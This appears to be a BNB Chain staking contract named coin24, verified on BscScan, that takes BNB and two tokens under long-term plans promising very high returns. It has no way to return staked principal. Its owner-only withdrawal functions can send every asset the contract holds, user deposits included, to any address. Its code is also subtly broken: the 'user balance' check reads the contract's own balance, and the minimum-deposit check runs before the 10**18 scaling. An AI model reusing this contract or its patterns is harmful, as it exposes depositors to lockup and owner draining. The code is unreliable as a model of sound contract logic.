/**
 *Submitted for verification at BscScan.com on 2022-11-21
*/

// SPDX-License-Identifier: none
pragma solidity ^0.8.12;
/**     
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {

  /**
  * @dev Multiplies two numbers, throws on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  /**
  * @dev Integer division of two numbers, truncating the quotient.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }
  /**
  * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  /**
  * @dev Adds two numbers, throws on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a); 
    return c;
  }
}
interface BEP20{
    function totalSupply() external view returns (uint theTotalSupply);
    function balanceOf(address _owner) external view returns (uint balance);
    function transfer(address _to, uint _value) external returns (bool success);
    function transferFrom(address _from, address _to, uint _value) external returns (bool success);
    function approve(address _spender, uint _value) external returns (bool success);
    function allowance(address _owner, address _spender) external view returns (uint remaining);
    event Transfer(address indexed _from, address indexed _to, uint _value);
    event Approval(address indexed _owner, address indexed _spender, uint _value);
}
contract Ownable {
  address public owner;  
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  constructor() {
    owner = msg.sender;
  }
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }
}


contract coin24 is Ownable {   
    BEP20 token; 
    uint public MIN_DEPOSIT_BUSD = 1 ;
    //address public tokenAddr = 0xB9d35811424600fa9E8cD62A0471fBd025131cb8; //mainnet
    address public yesTokenAddr = 0x7182Bc441b0ef15C965117f1EdF9B879499E38AC; //testnet

    //address public nearTokenAddr = 0x1Fa4a73a3F0133f0025378af00236f3aBDEE5D63;// mainnet
    address public nearTokenAddr = 0x045324Bc7829bd1be8663881e0e642e4bFf3314C;// testnet

    address contractAddress = address(this);
  
    
    struct Tariff {
        uint time;
        uint percent;
    }

    struct DepositBnb {
        uint tariff;
        uint amount;
        uint at;
        bool unstaked; 
    }
    struct DepositYes {
        uint tariff;
        uint amount;
        uint at;
        bool unstaked; 
    }
    struct DepositNear {
        uint tariff;
        uint amount;
        uint at;
        bool unstaked; 
    }

    struct Investor {
        bool registered;
        DepositBnb[] depositsBnb;
        DepositYes[] depositsYes;
        DepositNear[] depositsNear;
        uint bnbPaidAt;
        uint yesTokenPaidAt;
        uint nearTokenPaidAt;
        uint bnbWithdrawnAmt;
        uint yesTokenWithdrawnAmt;
        uint nearTokenWithdrawnAmt;
    }

    mapping (address => Investor) public investors;

    Tariff[] public tariffs;
    uint public totalInvested;
    address public contractAddr = address(this);
    constructor() {
        
        tariffs.push(Tariff(180 * 86400, 180*6));
        tariffs.push(Tariff(270  * 86400, 270*6));
        tariffs.push(Tariff(360  * 86400, 360*6));
        tariffs.push(Tariff(540  * 86400, 540*6));
        tariffs.push(Tariff(720  * 86400, 720*6));
    }
    using SafeMath for uint256;       
    event TokenAddressChaged(address tokenChangedAddress);    
    event DepositAt(address user, uint tariff, uint amount, uint token); 
    event Withdraw(address user, uint amount,uint token);


    function stakeBnb(uint _tariff) external payable {
        require(_tariff<tariffs.length,"Invalid Plan");
        investors[msg.sender].depositsBnb.push(DepositBnb(_tariff, msg.value, block.timestamp,false));
        investors[msg.sender].registered = true;
        emit DepositAt(msg.sender, _tariff, msg.value, 0);
    }

    function stakeNearToken(uint _tariff,uint amount) external payable {
        require(_tariff<tariffs.length,"Invalid Plan");
        require( (amount >= (MIN_DEPOSIT_BUSD*1000000000000000000)), "Minimum limit is 1");
        BEP20 nearToken    = BEP20(nearTokenAddr);
        amount = amount*(10**18);
        require(nearToken.allowance(msg.sender,contractAddr) >= amount, "Insufficient Allowance");
        require(nearToken.balanceOf(address(this)) >= amount, "Insufficient User Balance");

        nearToken.transferFrom(msg.sender, contractAddr, amount);
        
        investors[msg.sender].registered = true;
        investors[msg.sender].depositsNear.push(DepositNear( _tariff, amount, block.timestamp,false));
        
        emit DepositAt(msg.sender, _tariff, amount, 1);
    }

    function stakeYesToken(uint _tariff,uint amount) external payable {
        require(_tariff<tariffs.length,"Invalid Plan");
        require( (amount >= (MIN_DEPOSIT_BUSD*1000000000000000000)), "Minimum limit is 1");
        BEP20 yesToken    = BEP20(yesTokenAddr);
        amount = amount*(10**18);
        require(yesToken.allowance(msg.sender,contractAddr) >= amount, "Insufficient Allowance");
        require(yesToken.balanceOf(address(this)) >= amount, "Insufficient User Balance");

        yesToken.transferFrom(msg.sender, contractAddr, amount);

        investors[msg.sender].registered = true;
        investors[msg.sender].depositsYes.push(DepositYes( _tariff, amount, block.timestamp,false));
        emit DepositAt(msg.sender, _tariff, amount, 2);
    } 

    function bnbApy(address user) public view returns (uint amount) {
      Investor storage investor = investors[user];
      for (uint i = 0; i < investor.depositsBnb.length; i++) {
        DepositBnb storage dep = investor.depositsBnb[i];
        Tariff storage tariff = tariffs[dep.tariff];
        
        uint finish = dep.at + tariff.time;
        uint since = investor.bnbPaidAt > dep.at ? investor.bnbPaidAt : dep.at;
        uint till = block.timestamp > finish ? finish : block.timestamp;

        if (since < till && dep.unstaked==false) {
          amount += dep.amount * (till - since) * tariff.percent / tariff.time / 100;
        }
      }
    }

    function yesTokenApy(address user) public view returns (uint amount) {
      Investor storage investor = investors[user];
      for (uint i = 0; i < investor.depositsYes.length; i++) {
        DepositYes storage dep = investor.depositsYes[i];
        Tariff storage tariff = tariffs[dep.tariff];
        
        uint finish = dep.at + tariff.time;
        uint since = investor.yesTokenPaidAt > dep.at ? investor.yesTokenPaidAt : dep.at;
        uint till = block.timestamp > finish ? finish : block.timestamp;

        if (since < till && dep.unstaked==false) {
          amount += dep.amount * (till - since) * tariff.percent / tariff.time / 100;
        }
      }
    }

    function nearTokenApy(address user) public view returns (uint amount) {
      Investor storage investor = investors[user];
      for (uint i = 0; i < investor.depositsNear.length; i++) {
        DepositNear storage dep = investor.depositsNear[i];
        Tariff storage tariff = tariffs[dep.tariff];
        
        uint finish = dep.at + tariff.time;
        uint since = investor.nearTokenPaidAt > dep.at ? investor.nearTokenPaidAt : dep.at;
        uint till = block.timestamp > finish ? finish : block.timestamp;

        if (since < till && dep.unstaked==false) {
          amount += dep.amount * (till - since) * tariff.percent / tariff.time / 100;
        }
      }
    }


    function withdrawBnbApy(address userAddr) external {
        
        require(msg.sender==userAddr,"Invalid Address");
        uint amount = bnbApy(msg.sender);
        payable(userAddr).transfer(amount);
        investors[msg.sender].bnbPaidAt = block.timestamp;
        investors[msg.sender].bnbWithdrawnAmt += amount;
       
        emit Withdraw(msg.sender, amount,0);
    }

    function withdrawYesTokenApy() external {
        
        uint amount = yesTokenApy(msg.sender);
        require(BEP20(yesTokenAddr).balanceOf(contractAddr)>=amount,"Insuficient Contract Balance");
        BEP20(yesTokenAddr).transfer(msg.sender,amount);
        investors[msg.sender].yesTokenPaidAt = block.timestamp;
        investors[msg.sender].yesTokenWithdrawnAmt += amount;
       
        emit Withdraw(msg.sender, amount,1);
      
    }

    function withdrawNearTokenApy() external {
        
        uint amount = nearTokenApy(msg.sender);
        require(BEP20(nearTokenAddr).balanceOf(contractAddr)>=amount,"Insuficient Contract Balance");
        BEP20(nearTokenAddr).transfer(msg.sender,amount);
        investors[msg.sender].nearTokenPaidAt = block.timestamp;
        investors[msg.sender].nearTokenWithdrawnAmt += amount;
       
        emit Withdraw(msg.sender, amount,2);
    } 

    function withdrawalBnb(address payable _to, uint _amount) external{
        require(msg.sender == owner, "Only owner");
        require(_amount != 0, "Zero amount error");
        
        payable(_to).transfer( _amount);
    }

    function withdrawalToken(address payable _to, address _token, uint _amount) external{
        require(msg.sender == owner, "Only owner");
        require(_amount != 0, "Zero amount error");
        BEP20 tokenObj;
        uint amount   = _amount * 10**18;
        tokenObj = BEP20(_token);
        tokenObj.transfer(_to, amount);
    }
    function transferOwnership(address _to) public {
        require(msg.sender == owner, "Only owner");
        address oldOwner  = owner;
        owner = _to;
        emit OwnershipTransferred(oldOwner,_to);
    }

}